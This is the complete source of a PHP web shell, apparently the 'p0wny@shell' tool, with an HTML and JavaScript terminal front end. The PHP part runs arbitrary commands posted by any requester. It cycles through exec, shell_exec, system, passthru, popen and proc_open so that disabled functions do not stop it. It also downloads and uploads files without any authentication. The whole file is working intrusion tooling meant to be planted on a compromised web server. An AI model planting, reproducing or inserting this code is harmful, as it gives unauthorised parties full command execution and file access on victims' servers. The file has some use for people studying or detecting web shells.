<?php

$SHELL_CONFIG = [
    'username' => 'p0wny',
    'hostname' => 'shell',
];

function expandPath($path) {
    if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
        exec("echo $match[1]", $stdout);
        return $stdout[0] . $match[2];
    }
    return $path;
}

function allFunctionsExist($functions) {
    foreach ($functions as $func) {
        if (!function_exists($func)) {
            return false;
        }
    }
    return true;
}

function executeCommand($cmd) {
    $output = '';
    if (function_exists('exec')) {
        exec($cmd, $output);
        return implode("\n", $output);
    }
    if (function_exists('shell_exec')) {
        return shell_exec($cmd);
    }
    if (allFunctionsExist(['system', 'ob_start', 'ob_get_contents', 'ob_end_clean'])) {
        ob_start();
        system($cmd);
        $output = ob_get_contents();
        ob_end_clean();
        return $output;
    }
    if (allFunctionsExist(['passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'])) {
        ob_start();
        passthru($cmd);
        $output = ob_get_contents();
        ob_end_clean();
        return $output;
    }
    if (allFunctionsExist(['popen', 'feof', 'fread', 'pclose'])) {
        $handle = popen($cmd, 'r');
        while (!feof($handle)) {
            $output .= fread($handle, 4096);
        }
        pclose($handle);
        return $output;
    }
    if (allFunctionsExist(['proc_open', 'stream_get_contents', 'proc_close'])) {
        $handle = proc_open($cmd, [1 => ['pipe', 'w']], $pipes);
        $output = stream_get_contents($pipes[1]);
        proc_close($handle);
        return $output;
    }
    return $output;
}

function isRunningWindows() {
    return stripos(PHP_OS, "WIN") === 0;
}

function handleCommand($cmd, $cwd) {
    if (preg_match("/^\s*cd\s*(2>&1)?$/", $cmd)) {
        chdir(expandPath("~"));
    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd, $match)) {
        chdir($cwd);
        chdir(expandPath($match[1]));
    } elseif (preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match)) {
        chdir($cwd);
        return downloadFile($match[1]);
    } else {
        chdir($cwd);
        return ['stdout' => base64_encode(executeCommand($cmd)), 'cwd' => base64_encode(getcwd())];
    }
}

function downloadFile($filePath) {
    $file = @file_get_contents($filePath);
    if ($file === false) {
        return ['stdout' => base64_encode('File not found / no read permission.'), 'cwd' => base64_encode(getcwd())];
    }
    return ['name' => base64_encode(basename($filePath)), 'file' => base64_encode($file)];
}

function uploadFile($path, $file, $cwd) {
    chdir($cwd);
    if (@file_put_contents($path, base64_decode($file)) === false) {
        return ['stdout' => base64_encode('Invalid path / no write permission.'), 'cwd' => base64_encode(getcwd())];
    }
    return ['stdout' => base64_encode('Done.'), 'cwd' => base64_encode(getcwd())];
}

function initShellConfig() {
    global $SHELL_CONFIG;
    $SHELL_CONFIG['username'] = isRunningWindows() ? getenv('USERNAME') : posix_getpwuid(posix_geteuid())['name'];
    $SHELL_CONFIG['hostname'] = gethostname();
}

if (isset($_GET['feature'])) {
    switch ($_GET['feature']) {
        case 'shell':
            $cmd = $_POST['cmd'];
            if (!preg_match('/2>/', $cmd)) {
                $cmd .= ' 2>&1';
            }
            $response = handleCommand($cmd, $_POST['cwd']);
            break;
        case 'upload':
            $response = uploadFile($_POST['path'], $_POST['file'], $_POST['cwd']);
            break;
        default:
            $response = ['error' => 'Unknown feature'];
    }

    header('Content-Type: application/json');
    echo json_encode($response);
    die();
} else {
    initShellConfig();
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>p0wny@shell:~#</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { margin: 0; padding: 0; background: #333; color: #eee; font-family: monospace; height: 100vh; }
        #shell { background: #222; max-width: 100vw; max-height: 100vh; margin: 25px; padding: 10px; box-shadow: 0 0 5px rgba(0,0,0,0.3); }
        #shell-content { white-space: pre-wrap; overflow-y: auto; padding: 5px; }
        #shell-input { display: flex; padding-top: 10px; border-top: 1px solid rgba(255,255,255,0.05); }
        #shell-prompt { font-weight: bold; color: #75DF0B; }
        #shell-cmd { flex: 1; background: transparent; border: none; color: #eee; font-family: monospace; }
        *::-webkit-scrollbar { width: 8px; }
        *::-webkit-scrollbar-track { background: #353535; }
        *::-webkit-scrollbar-thumb { background: #bcbcbc; }
    </style>
</head>
<body>
    <div id="shell">
        <pre id="shell-content">
            <div id="shell-logo">
    ___                         ____      _          _ _        _  _   <span></span>
 _ __  / _ \__      ___ __  _   _  / __ \ ___| |__   ___| | |_ /\/|| || |_ <span></span>
| '_ \| | | \ \ /\ / / '_ \| | | |/ / _` / __| '_ \ / _ \ | (_)/\/_  ..  _|<span></span>
| |_) | |_| |\ V  V /| | | | |_| | | (_| \__ \ | | |  __/ | |_   |_      _|<span></span>
| .__/ \___/  \_/\_/ |_| |_|\__, |\ \__,_|___/_| |_|\___|_|_(_)    |_||_|  <span></span>
|_|                         |___/  \____/                                  <span></span>
            </div>
        </pre>
        <div id="shell-input">
            <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
            <input id="shell-cmd" name="cmd" />
        </div>
    </div>
    <script>
        var SHELL_CONFIG = <?php echo json_encode($SHELL_CONFIG); ?>;
        var CWD = null;
        var commandHistory = [];
        var historyPosition = 0;
        var eShellCmdInput = document.getElementById("shell-cmd");
        var eShellContent = document.getElementById("shell-content");

        function insertCommand(command) {
            eShellContent.innerHTML += `\n\n<span class="shell-prompt">${genPrompt(CWD)}</span> ${command}\n`;
            eShellContent.scrollTop = eShellContent.scrollHeight;
        }

        function insertStdout(stdout) {
            eShellContent.innerHTML += stdout;
            eShellContent.scrollTop = eShellContent.scrollHeight;
        }

        function makeRequest(url, params, callback) {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", url, true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    callback(JSON.parse(xhr.responseText));
                }
            };
            xhr.send(new URLSearchParams(params).toString());
        }

        function genPrompt(cwd) {
            return `${SHELL_CONFIG.username}@${SHELL_CONFIG.hostname}:${cwd || '~'}#`;
        }

        function executeShellCommand(command) {
            insertCommand(command);
            makeRequest("?feature=shell", { cmd: command, cwd: CWD }, function(response) {
                if (response.stdout) {
                    insertStdout(atob(response.stdout));
                    CWD = atob(response.cwd);
                    document.getElementById("shell-prompt").innerText = genPrompt(CWD);
                }
            });
        }

        document.getElementById("shell-cmd").onkeydown = function(event) {
            if (event.key === "Enter") {
                executeShellCommand(eShellCmdInput.value);
                commandHistory.push(eShellCmdInput.value);
                eShellCmdInput.value = "";
                historyPosition = commandHistory.length;
            } else if (event.key === "ArrowUp") {
                if (historyPosition > 0) {
                    historyPosition--;
                    eShellCmdInput.value = commandHistory[historyPosition];
                }
            } else if (event.key === "ArrowDown") {
                if (historyPosition < commandHistory.length) {
                    historyPosition++;
                    eShellCmdInput.value = commandHistory[historyPosition] || '';
                }
            }
        };

        window.onload = function() {
            document.getElementById("shell-cmd").focus();
            document.getElementById("shell-prompt").innerText = genPrompt(CWD);
        };
    </script>
</body>
</html>
